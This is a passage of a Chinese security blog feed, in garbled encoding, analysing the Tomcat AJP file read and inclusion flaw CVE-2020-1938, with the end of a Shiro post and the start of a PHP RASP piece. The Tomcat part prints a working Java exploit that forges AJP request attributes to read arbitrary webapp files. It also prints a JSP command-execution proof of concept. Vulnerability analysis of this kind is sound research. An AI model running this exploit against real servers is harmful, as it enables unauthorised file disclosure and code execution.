href="https://github.com/3ndz/Shiro-721" target="_blank" rel="noopener">https://github.com/3ndz/Shiro-721</a></p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>è¿™æ®µæ—¶é—´ä»å¯†ç å­¦åˆ°shiroååºåˆ—åŒ–çš„å‡ ä¸ªç‰ˆæœ¬æ¼æ´åˆ†æï¼Œç®—æ³•åŠŸåº•è¿˜å¾—åŠ å¼ºï¼Œæ¥ä¸‹æ¥çš„æ—¶é—´ç ”ç©¶ä¸€ä¸‹shiroååºåˆ—åŒ–RCEçš„å›æ˜¾é—®é¢˜ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š</p><ul><li><a href="https://saucer-man.com/information_security/396.html" target="_blank" rel="noopener">åˆ†æè°ƒè¯•apache shiroååºåˆ—åŒ–æ¼æ´(CVE-2016-4437)</a>                                                    </li><li><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/" target="_blank" rel="noopener">ã€æ¼æ´åˆ†æã€‘Shiro RememberMe 1.2.4 ååºåˆ—åŒ–å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œæ¼æ´</a></li><li><a href="https://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html" target="_blank" rel="noopener">pwn-ctf-platform-with-java-jrmp-gadget</a>    </li><li><a href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html" target="_blank" rel="noopener">Exploiting JVM deserialization vulns despite a broken class loader</a>    </li><li><a href="https://www.anquanke.com/post/id/193165" target="_blank" rel="noopener">Shiro 721 Padding Oracleæ”»å‡»æ¼æ´åˆ†æ</a></li><li><a href="https://p0sec.net/index.php/archives/126/" target="_blank" rel="noopener">p0:Shiro Padding Oracle Attack ååºåˆ—åŒ–</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="https://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="https://0day.design/tags/Java/"/>
    
      <category term="æ¼æ´åˆ†æ" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat-Ajp åè®®æ¼æ´åˆ†æ(CVE-2020-1938)</title>
    <link href="https://0day.design/2020/03/02/Tomcat-Ajp%20%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2020-1938)/"/>
    <id>https://0day.design/2020/03/02/Tomcat-Ajp åè®®æ¼æ´åˆ†æ(CVE-2020-1938)/</id>
    <published>2020-03-02T15:14:00.000Z</published>
    <updated>2020-03-19T12:47:56.506Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>Tomcatæ˜¯ç”±Apacheè½¯ä»¶åŸºé‡‘ä¼šå±ä¸‹Jakartaé¡¹ç›®å¼€å‘çš„Servletå®¹å™¨ï¼ŒæŒ‰ç…§Sun Microsystemsæä¾›çš„æŠ€æœ¯è§„èŒƒï¼Œå®ç°äº†å¯¹Servletå’ŒJavaServer Pageï¼ˆJSPï¼‰çš„æ”¯æŒã€‚ç”±äºTomcatæœ¬èº«ä¹Ÿå†…å«äº†HTTPæœåŠ¡å™¨ï¼Œå› æ­¤ä¹Ÿå¯ä»¥è§†ä½œå•ç‹¬çš„WebæœåŠ¡å™¨ã€‚</p><h2 id="æ¼æ´å½±å“"><a href="#æ¼æ´å½±å“" class="headerlink" title="æ¼æ´å½±å“"></a>æ¼æ´å½±å“</h2><p>è¯¥æ¼æ´å¯ä»¥ç”¨æ¥è¯»å–æˆ–åŒ…å« Tomcat ä¸Šæ‰€æœ‰ webappç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´å½±å“ä»¥ä¸‹ç‰ˆæœ¬ï¼š</p><ul><li>Apache Tomcat 9.x &lt; 9.0.31</li><li>Apache Tomcat 8.x &lt; 8.5.51</li><li>Apache Tomcat 7.x &lt; 7.0.100</li><li>Apache Tomcat 6.x</li></ul><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>æµ‹è¯•ç‰ˆæœ¬8.5.16ï¼Œç”¨çš„macä¸‹Mxsrvsè‡ªå¸¦çš„tomcatã€‚<br>åœ¨/bin/catalina.shæ–‡ä»¶å¤´éƒ¨é‡Œå¢åŠ ä¸€è¡Œï¼Œè®¾ç½®è°ƒè¯•ç«¯å£ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export JPDA_ADDRESS=9901</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007674.jpg" alt="-w783"></p><p>å†ä¿®æ”¹ä¸€ä¸‹startup.shçš„æœ€åä¸€è¡Œ:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#exec &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; start &quot;$@&quot;</span><br><span class="line">exec &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; jpda start &quot;$@&quot;</span><br></pre></td></tr></table></figure></p><p>Ideaé‡Œé…ç½®ä¸€ä¸‹<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007683.jpg" alt="-w978"></p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>EXPï¼š <a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007693.jpg" alt="-w702"></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æœ¬åœ°æµ‹è¯•8.5.16ç‰ˆæœ¬ï¼Œtomcaté»˜è®¤å¼€å¯ä¸‰ä¸ªç«¯å£ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007700.jpg" alt="-w751"><br>åœ¨/conf/server.xmlä¸­é…ç½®ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007709.jpg" alt="-w774"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007717.jpg" alt="-w480"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007725.jpg" alt="-w805"></p><p>TomcatæœåŠ¡å™¨é€šè¿‡Connectorè¿æ¥å™¨ç»„ä»¶ä¸å®¢æˆ·ç¨‹åºå»ºç«‹è¿æ¥ï¼Œconnectorç»„ä»¶è´Ÿè´£æ¥æ”¶å®¢æˆ·çš„è¯·æ±‚ï¼Œä»¥åŠæŠŠTomcatæœåŠ¡å™¨çš„å“åº”ç»“æœå‘é€ç»™å®¢æˆ·ã€‚</p><p>åœ¨ä¸Šå›¾çš„é…ç½®ä¸­æœ‰ä¸¤ä¸ªconnectï¼Œå³8080ç«¯å£å¯¹åº”ç€Http Connectorï¼Œä½¿ç”¨httpï¼ˆHTTP/1.1ï¼‰åè®®ï¼›8009ä½¿ç”¨çš„AJP Connectorï¼Œä½¿ç”¨çš„æ˜¯ AJP åè®®ï¼ˆApache Jserv Protocolï¼‰æ˜¯å®šå‘åŒ…åè®®ã€‚å› ä¸ºæ€§èƒ½åŸå› ï¼Œä½¿ç”¨äºŒè¿›åˆ¶æ ¼å¼æ¥ä¼ è¾“å¯è¯»æ€§æ–‡æœ¬ï¼Œå®ƒèƒ½é™ä½ HTTP è¯·æ±‚çš„å¤„ç†æˆæœ¬ï¼Œå› æ­¤ä¸»è¦åœ¨éœ€è¦é›†ç¾¤ã€åå‘ä»£ç†çš„åœºæ™¯è¢«ä½¿ç”¨ã€‚æ›´è¯¦ç»†çš„ä»‹ç»å¯ä»¥å‚è€ƒä¸€ä¸‹AJPåè®®çš„å®˜æ–¹æ–‡æ¡£:<a href="https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html" target="_blank" rel="noopener">The Apache Tomcat Connectors - AJP Protocol Reference</a></p><p>Webå®¢æˆ·è®¿é—®çš„ä¸¤ç§æ–¹å¼ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007733.jpg" alt=""></p><h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p>é…ç½®ideaçš„æ—¶å€™å…ˆä¸‹ä¸ªæºç ï¼š<a href="https://repo1.maven.org/maven2/org/apache/tomcat/tomcat-coyote/8.5.16/tomcat-coyote-8.5.16-sources.jar" target="_blank" rel="noopener">https://repo1.maven.org/maven2/org/apache/tomcat/tomcat-coyote/8.5.16/tomcat-coyote-8.5.16-sources.jar</a></p><p>tomcat-coyote.jar!/org/apache/coyote/ajp/AjpProcessor.class#prepareRequest<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007742.jpg" alt="-w1008"><br>åœ¨AJPåè®®çš„è¯·æ±‚ç»“æ„ä¸­æœ‰è¿™æ ·ä¸€ä¸ªå­—æ®µ<em>å±æ€§</em><code>attributes</code>ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007752.jpg" alt="-w1014"><br>å¯¹åº”ä¸Šæ–‡ä»£ç ä¸­<code>switch case</code>ä¸­çš„åŒ¹é…é¡¹ï¼Œè·Ÿè¿›<code>Constants.SC_A_REQ_ATTRIBUTE</code>ï¼š/org/apache/coyote/ajp/Constants.java<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007762.jpg" alt="-w1020"><br>è¿™é‡Œå®šä¹‰äº†æ‰€æœ‰å±æ€§ï¼Œ<code>Constants.SC_A_REQ_ATTRIBUTE</code>è¿™ä¸ªcaseåœ¨æ–‡æ¡£ä¸­å¯¹åº”<code>req_attribute</code>å±æ€§ï¼Œæ„æ€æ˜¯è¯´ï¼Œå¦‚æœè¦å‘è¶…å‡ºä¸Šè¿°åŸºç¡€å±æ€§ä»¥å¤–çš„å€¼ï¼Œéƒ½å¯ä»¥é€šè¿‡<code>req_attribute(0X0A)</code>æ¥è®¾ç½®å…¶å±æ€§åå’Œå€¼æ¥å‘é€ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007774.jpg" alt="-w1490"><br>ä¸éš¾ç†è§£ï¼Œä¹Ÿå°±å¯¹åº”ç€è¿™é‡Œçš„å¤„ç†é€»è¾‘ï¼Œå¦‚æœæ˜¯åœ¨ä¸Šè¿°ä¹‹å¤–å±æ€§ï¼Œåˆ™å…è®¸æˆ‘ä»¬è‡ªå®šä¹‰ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007784.jpg" alt="-w977"></p><p>è¿™é‡Œå…¶å®å°±æ˜¯å…è®¸æˆ‘ä»¬è®¾ç½®Requestå¯¹è±¡çš„attributeå±æ€§ã€‚åœ¨ä¸‹æ–‡ä¸­ä¼šæåˆ°çš„å‡ ä¸ªå±æ€§å¯ä»¥è¢«è®¾ç½®ï¼š</p><ul><li>javax.servlet.include.request_uri</li><li>javax.servlet.include.path_info</li><li>javax.servlet.include.servlet_path</li></ul><p>å°è£…å®Œrequestå¯¹è±¡åï¼Œç»§ç»­å¤„ç†Servletçš„æ˜ å°„æµç¨‹<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007796.jpg" alt="-w1431"></p><h3 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h3><p>å½“urlè¯·æ±‚æœªåœ¨æ˜ å°„çš„urlåˆ—è¡¨é‡Œé¢åˆ™ä¼šé€šè¿‡tomcaté»˜è®¤çš„DefaultServletä¼šæ ¹æ®ä¸Šé¢çš„ä¸‰ä¸ªå±æ€§æ¥è¯»å–æ–‡ä»¶ï¼Œ<code>/org/apache/catalina/servlets/DefaultServlet.class</code>ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007806.jpg" alt="-w1459"><br>è·Ÿè¿›<code>getRelativePath</code>å‡½æ•°ï¼Œå½“<code>request</code>å±æ€§ä¸­<code>javax.servlet.include.request_uri</code>ä¸ä¸ºç©ºï¼Œåˆ™å–å‡ºå¦å¤–ä¸¤ä¸ª<code>javax.servlet.include.path_info</code>å’Œ<code>javax.servlet.include.servlet_path</code>å±æ€§ï¼Œæœ€ååŠ åˆ°<code>result</code>é‡Œè¿”å›ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007815.jpg" alt="-w1133"></p><p>ç„¶åå°†ç»“æœå¸¦å…¥<code>this.resources.getResource</code>å‡½æ•°ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007826.jpg" alt="-w1584"><br>ç„¶åä¸€ç›´è·Ÿè¿›ï¼Œç›´åˆ°è°ƒç”¨<code>this.cache.getResource</code>å‡½æ•°è¯»å–èµ„æºï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007838.jpg" alt="-w1651"></p><p>è¯»å–åˆ°<code>/WEB-INF/web.xml</code>æ–‡ä»¶ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007847.jpg" alt="-w1139"></p><h3 id="ä»»æ„æ–‡ä»¶åŒ…å«"><a href="#ä»»æ„æ–‡ä»¶åŒ…å«" class="headerlink" title="ä»»æ„æ–‡ä»¶åŒ…å«"></a>ä»»æ„æ–‡ä»¶åŒ…å«</h3><p>å½“urlè¯·æ±‚æ˜ å°„åœ¨<code>org.apache.jasper.servlet.JspServlet</code>è¿™ä¸ªservletçš„æ—¶å€™ä¹Ÿå¯é€šè¿‡ä¸Šè¿°ä¸‰ä¸ªå±æ€§æ¥æ§åˆ¶è®¿é—®çš„jspæ–‡ä»¶ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007859.jpg" alt="-w1253"></p><p>éšä¾¿åŒ…å«ä¸€ä¸ªä¸Šä¼ çš„æ–‡ä»¶:<br>upload<br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> <span class="keyword">import</span>=<span class="string">"java.lang.*"</span> contentType=<span class="string">"text/html; charset=ISO-8859-1"</span></span><br><span class="line">    pageEncoding=<span class="string">"ISO-8859-1"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"open -a Calculator"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062007869.jpg" alt="-w1377"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>ajpåè®®çš„é€šä¿¡å®¢æˆ·ç«¯demo: <a href="https://github.com/kohsuke/ajp-client" target="_blank" rel="noopener">https://github.com/kohsuke/ajp-client</a></p><p>è¿™é‡Œè´´ä¸€ä¸ªthreedr3amå¸ˆå‚…çš„EXP: <a href="https://github.com/threedr3am/learnjavabug" target="_blank" rel="noopener">https://github.com/threedr3am/learnjavabug</a><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileRead</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    SimpleAjpClient ac = <span class="keyword">new</span> SimpleAjpClient();</span><br><span class="line">    String host = <span class="string">"localhost"</span>;</span><br><span class="line">    <span class="keyword">int</span> port = <span class="number">8009</span>;</span><br><span class="line">    String uri = <span class="string">"/xxxxxxxxxxxxxxxest.xxx"</span>;</span><br><span class="line">    String file = <span class="string">"/index.jsp"</span>;</span><br><span class="line">    <span class="keyword">if</span> (args.length == <span class="number">4</span>) &#123;</span><br><span class="line">      host = args[<span class="number">0</span>];</span><br><span class="line">      port = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">      uri = args[<span class="number">2</span>].equalsIgnoreCase(<span class="string">"file"</span>) ? uri : <span class="string">"/xxxxxxxxxxxxxxxest.jsp"</span>;</span><br><span class="line">      file = args[<span class="number">3</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    ac.connect(host, port);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create a message that indicates the beginning of the request</span></span><br><span class="line">    TesterAjpMessage forwardMessage = ac.createForwardMessage(uri);</span><br><span class="line">    forwardMessage.addAttribute(<span class="string">"javax.servlet.include.request_uri"</span>, <span class="string">"1"</span>);</span><br><span class="line">    forwardMessage.addAttribute(<span class="string">"javax.servlet.include.path_info"</span>, file);</span><br><span class="line">    forwardMessage.addAttribute(<span class="string">"javax.servlet.include.servlet_path"</span>, <span class="string">""</span>);</span><br><span class="line">    forwardMessage.end();</span><br><span class="line">    ac.sendMessage(forwardMessage);</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">byte</span>[] responseBody = ac.readMessage();</span><br><span class="line">      <span class="keyword">if</span> (responseBody == <span class="keyword">null</span> || responseBody.length == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      System.out.print(<span class="keyword">new</span> String(responseBody));</span><br><span class="line">    &#125;</span><br><span class="line">    ac.disconnect();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ¯”è¾ƒç®€å•ï¼Œæ²¡å•¥å¥½è¯´çš„ï¼ŒæŒ‡å®šè·¯ç”±ä¸ºjspçš„æ—¶å€™èµ°<code>org.apache.jasper.servlet.JspServlet</code>å¤„ç†ï¼Œå…¶ä»–åˆ™èµ°<code>/org/apache/catalina/servlets/DefaultServlet</code>é»˜è®¤å¤„ç†ã€‚</p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>æ´æŒºç‰›é€¼çš„ï¼Œè™½ç„¶ä¸èƒ½ç›´æ¥å‘½ä»¤æ‰§è¡Œï¼Œæœ¬åœ°çš„mxsrvså¯åŠ¨tomcatçš„æ—¶å€™é»˜è®¤å¯åŠ¨8009ï¼Œä½†æ˜¯å®æµ‹äº†ä¸€äº›çœŸå®ç¯å¢ƒçš„ï¼Œç‹¬ç«‹éƒ¨ç½²çš„æ—¶å€™å¤§éƒ½æ²¡æœ‰ajpè¿™ä¸ªç«¯å£ï¼Œæˆ–è®¸åœ¨è´Ÿè½½å‡è¡¡åä»£çš„åœºæ™¯æ¯”è¾ƒå¤šï¼Ÿ</p><p> å‚è€ƒæ–‡ç« </p><ul><li><a href="https://www.anquanke.com/post/id/199448" target="_blank" rel="noopener">CVE-2020-1938 : Tomcat-Ajp åè®®æ¼æ´åˆ†æ</a></li><li><a href="https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html" target="_blank" rel="noopener">The Apache Tomcat Connectors - AJP Protocol Reference</a></li><li><a href="https://juejin.im/post/5cf6366ce51d45105e021275" target="_blank" rel="noopener">å¦‚ä½•æ–­ç‚¹è°ƒè¯•Tomcatæºç </a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="https://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="https://0day.design/tags/Java/"/>
    
      <category term="æ¼æ´åˆ†æ" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ä»0å¼€å§‹çš„PHP RASPçš„å­¦ä¹ </title>
    <link href="https://0day.design/2020/03/01/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84PHP%20RASP%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <id>https://0day.design/2020/03/01/ä»0å¼€å§‹çš„PHP RASPçš„å­¦ä¹ /</id>
    <published>2020-03-01T10:29:00.000Z</published>
    <updated>2020-03-19T12:47:56.509Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><h3 id="RASP-è®¾è®¡æ€è·¯"><a href="#RASP-è®¾è®¡æ€è·¯" class="headerlink" title="RASP è®¾è®¡æ€è·¯"></a>RASP è®¾è®¡æ€è·¯</h3><p>RASPï¼ˆRuntime Application self-protectionï¼‰æ˜¯ä¸€ç§åœ¨è¿è¡Œæ—¶æ£€æµ‹æ”»å‡»å¹¶ä¸”è¿›è¡Œè‡ªæˆ‘ä¿æŠ¤çš„ä¸€ç§æŠ€æœ¯ã€‚PHP RASPçš„è®¾è®¡æ€è·¯å¾ˆç›´æ¥ï¼Œå®‰å…¨åœˆæœ‰ä¸€å¥åè¨€å«ä¸€åˆ‡è¾“å…¥éƒ½æ˜¯æœ‰å®³çš„ï¼Œæˆ‘ä»¬å°±è·Ÿè¸ªè¿™äº›æœ‰å®³å˜é‡ï¼Œçœ‹å®ƒä»¬æ˜¯å¦å¯¹ç³»ç»Ÿé€ æˆäº†å±å®³ã€‚æˆ‘ä»¬è·Ÿè¸ªäº†HTTPè¯·æ±‚ä¸­çš„æ‰€æœ‰å‚æ•°ã€HTTP Headerç­‰ä¸€åˆ‡clientç«¯å¯æ§çš„å˜é‡ï¼Œéšç€è¿™äº›å˜é‡è¢«ä½¿ç”¨ã€è¢«å¤åˆ¶ï¼Œä¿¡æ¯éšä¹‹æµåŠ¨ï¼Œæˆ‘ä»¬ä¹Ÿè·Ÿè¸ªäº†è¿™äº›ä¿¡æ¯çš„æµåŠ¨ã€‚æˆ‘ä»¬è¿˜é€‰å–äº†ä¸€äº›æ•æ„Ÿå‡½æ•°ï¼Œè¿™äº›å‡½æ•°éƒ½æ˜¯å¼•å‘æ¼æ´çš„å‡½æ•°ï¼Œä¾‹å¦‚requireå‡½æ•°èƒ½å¼•å‘æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œmysqli-&gt;queryæ–¹æ³•èƒ½å¼•å‘SQLæ³¨å…¥æ¼æ´ã€‚ç®€å•æ¥è¯´ï¼Œè¿™äº›å‡½æ•°éƒ½æ˜¯å¤§å®¶åœ¨ä»£ç å®¡è®¡æ—¶å…³æ³¨çš„å‡½æ•°ã€‚æˆ‘ä»¬åˆ©ç”¨æŸäº›æ–¹æ³•ä¸ºè¿™äº›å‡½æ•°æ·»åŠ å®‰å…¨æ£€æŸ¥ä»£ç ã€‚å½“è·Ÿè¸ªçš„ä¿¡æ¯æµæµå…¥æ•æ„Ÿå‡½æ•°æ—¶ï¼Œè§¦å‘å®‰å…¨æ£€æŸ¥ä»£ç ï¼Œå¦‚æœé€šè¿‡å®‰å…¨æ£€æŸ¥ï¼Œå¼€å§‹æ‰§è¡Œæ•æ„Ÿå‡½æ•°ï¼Œå¦‚æœæ²¡é€šè¿‡å®‰å…¨æ£€æŸ¥ï¼Œé˜»æ–­æ‰§è¡Œï¼Œé€šè¿‡SAPIå‘HTTP Serverå‘é€403 Forbiddenä¿¡æ¯ã€‚å½“ç„¶ï¼Œè¿™ä¸€åˆ‡éƒ½åœ¨PHPä»£ç è¿è¡Œè¿‡ç¨‹ä¸­å®Œæˆã€‚</p><p>è¿™é‡Œä¸»è¦æœ‰ä¸¤ä¸ªæŠ€æœ¯é—®é¢˜ï¼Œä¸€ä¸ªæ˜¯å¦‚ä½•è·Ÿè¸ªä¿¡æ¯æµï¼Œå¦ä¸€ä¸ªæ˜¯å¦‚ä½•å®‰å…¨æ£€æŸ¥åˆ°åº•æ˜¯æ€æ ·å®ç°çš„ã€‚<br>æœ‰ä¸¤ä¸ªæŠ€æœ¯æ€è·¯æ¥è§£å†³ä¸¤ä¸ªé—®é¢˜ï¼Œç¬¬ä¸€ä¸ªæ˜¯åŠ¨æ€æ±¡ç‚¹è·Ÿè¸ªï¼Œå¦ä¸€ä¸ªæ˜¯åŸºäºè¯æ³•åˆ†æçš„æ¼æ´æ£€æµ‹ã€‚æœ¬æ–‡ç”¨ä¸»è¦åˆ†æçš„æ˜¯æ±¡ç‚¹æ ‡è®°çš„æ–¹æ³•ã€‚</p><h3 id="æŠ€æœ¯æ ˆ"><a href="#æŠ€æœ¯æ ˆ" class="headerlink" title="æŠ€æœ¯æ ˆ"></a>æŠ€æœ¯æ ˆ</h3><ul><li>taintæ±¡ç‚¹åˆ†ææ¨¡å¼<ul><li>å‘½ä»¤æ‰§è¡Œ</li><li>XSS</li><li>SQL</li></ul></li><li>payloadæ¨¡å¼ï¼šé‡å‘½å+phpwaf<ul><li>ç‰¹å¾æ•è·æ£€æµ‹</li></ul></li></ul><p>ç®€è€Œè¨€ä¹‹taintæ£€æµ‹æœªçŸ¥ï¼Œpayloadä¸Šçº¿å‰Fuzzæ£€æµ‹<br>taintï¼šæ±¡ç‚¹æ ‡è®°ï¼Œå¯¹å‚æ•°ä¼ é€’è¿‡ç¨‹è¿›è¡Œåˆ¤æ–­æ¸…é™¤æˆ–ä¿ç•™æ ‡è®°<br>payloadæ¨¡å¼ï¼šå¿½ç•¥å‚æ•°ä¼ é€’è¿‡ç¨‹ï¼Œåªåˆ†ææœ€åä½œç”¨äºæ•æ„Ÿå‡½æ•°çš„å‚æ•°æ˜¯å¦æ¶æ„</p><h3 id="PHPç”Ÿå‘½å‘¨æœŸ"><a href="#PHPç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="PHPç”Ÿå‘½å‘¨æœŸ"></a>PHPç”Ÿå‘½å‘¨æœŸ</h3><p>ç®€è€Œè¨€ä¹‹ï¼Œæ— è®ºä»¥å“ªç§æ–¹å¼å¯åŠ¨phpç¨‹åºï¼Œç»è¿‡ä¸‹è¾¹å››ä¸ªæ­¥éª¤ï¼šæ¨¡å—åˆå§‹åŒ–ï¼ˆMINITï¼‰ã€è¯·æ±‚åˆå§‹åŒ–(RINIT)ã€è¯·æ±‚å¤„ç†ã€è¯·æ±‚ç»“æŸ(RSHUTDOWN)ã€æ¨¡å—ç»“æŸ(MSHUTDOWN)<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338261.jpg" alt="-w117"><br>è¿™å››ä¸ªé˜¶æ®µå¯¹åº”æ‰©å±•å¼€å‘ä¸­<code>PHP_MINIT_FUNCTION</code>ã€<code>PHP_MSHUTDOWN_FUNCTION</code>ã€<code>PHP_RINIT_FUNCTION</code>ã€<code>PHP_RSHUTDOWN_FUNCTION</code>å››ä¸ªå‡½æ•°æ¥å¤„ç†å¯¹åº”çš„åŠŸèƒ½ã€‚</p><h3 id="php-opcode"><a href="#php-opcode" class="headerlink" title="php opcode"></a>php opcode</h3><p>opcodeæ˜¯è®¡ç®—æœºæŒ‡ä»¤ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºæŒ‡å®šè¦æ‰§è¡Œçš„æ“ä½œï¼ŒæŒ‡ä»¤çš„æ ¼å¼å’Œè§„èŒƒç”±å¤„ç†å™¨çš„æŒ‡ä»¤è§„èŒƒæŒ‡å®šã€‚</p><p>è®°å½•ä¸€ä¸‹phpè§£æçš„è¿‡ç¨‹ï¼š</p><ul><li>æ—§ç‰ˆæœ¬ï¼šphpä»£ç â€”&gt;è¯æ³•ã€è¯­æ³•åˆ†æ-&gt;ç›´æ¥ç”ŸæˆopcodeæŒ‡ä»¤</li><li>php7ï¼šphpä»£ç â€”&gt;è¯æ³•ã€è¯­æ³•åˆ†æç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘AST-&gt;opcodeæŒ‡ä»¤</li></ul><p>ç®€å•æ¦‚æ‹¬ä¸€ä¸‹ï¼Œæ‰€æœ‰phpä»£ç æœ€ç»ˆä»¥opcodeæŒ‡ä»¤çš„å½¢å¼åœ¨zendè™šæ‹Ÿæœºä¸­æ‰§è¡Œã€‚</p><h3 id="å‡½æ•°å®ç°"><a href="#å‡½æ•°å®ç°" class="headerlink" title="å‡½æ•°å®ç°"></a>å‡½æ•°å®ç°</h3><p>PHPä¸­å‡½æ•°çš„å­˜å‚¨ç»“æ„ï¼š/Zend/zend_compile.h#404<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 